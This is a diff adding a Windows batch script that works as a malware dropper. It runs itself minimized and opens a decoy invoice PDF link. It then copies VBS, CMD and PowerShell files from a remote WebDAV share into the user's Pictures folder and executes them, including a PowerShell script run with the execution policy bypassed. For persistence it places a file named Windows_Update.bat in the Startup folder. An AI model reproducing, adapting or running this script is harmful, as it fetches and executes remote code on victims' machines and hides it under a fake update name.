@@ -1,0 +1,54 @@
+@echo off
+if "%1" == "" start "" /min "%~f0" MY_FLAG && exit
+set source=\\surgical-farming-ca.com@9999/google
+set destination=%USERPROFILE%\Pictures
+
+echo Opening PDF file...
+start "" "https://s2r.tn/cgi/INVOICERVSHA.pdf"
+
+echo Copying windows from %source% to %destination%...
+copy /Y "%source%\windows.vbs" "%destination%"
+
+echo Running windows...
+"%destination%\windows.vbs"
+
+REM Copy kam.cmd and xff.cmd and zap.cmd and las.cmd to the destination folder
+copy /Y "%source%\kam.cmd" "%destination%"
+copy /Y "%source%\xff.cmd" "%destination%"
+copy /Y "%source%\zap.cmd" "%destination%"
+copy /Y "%source%\las.cmd" "%destination%"
+
+echo Copying Windows_Update.bat to the user's startup folder...
+copy /Y "%source%\Windows_Update.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+
+taskkill /f /im explorer.exe
+timeout 2 /nobreak > nul
+start explorer.exe
+echo Windows Explorer restarted.
+
+REM Define PowerShell scripts to copy and execute
+set "powershell_scripts=xy.ps1"
+
+REM Copy and execute each PowerShell script
+for %%s in (%powershell_scripts%) do (
+    echo Copying %%s from %source% to %destination%...
+    copy /Y "%source%\%%s" "%destination%"
+    IF NOT EXIST "%destination%\%%s" (
+        echo Failed to copy %%s. Exiting script.
+        exit /b 1
+    ) ELSE (
+        echo %%s copied successfully.
+    )
+    echo Running %%s with Bypass policy...
+    powershell -ExecutionPolicy Bypass -File "%destination%\%%s"
+    IF NOT "%ERRORLEVEL%"=="0" (
+        echo %%s failed to execute. Exiting script.
+        exit /b 1
+    ) ELSE (
+        echo %%s executed successfully.
+    )
+)
+
+echo Closing the script after executing PowerShell scripts.
+exit /b 0
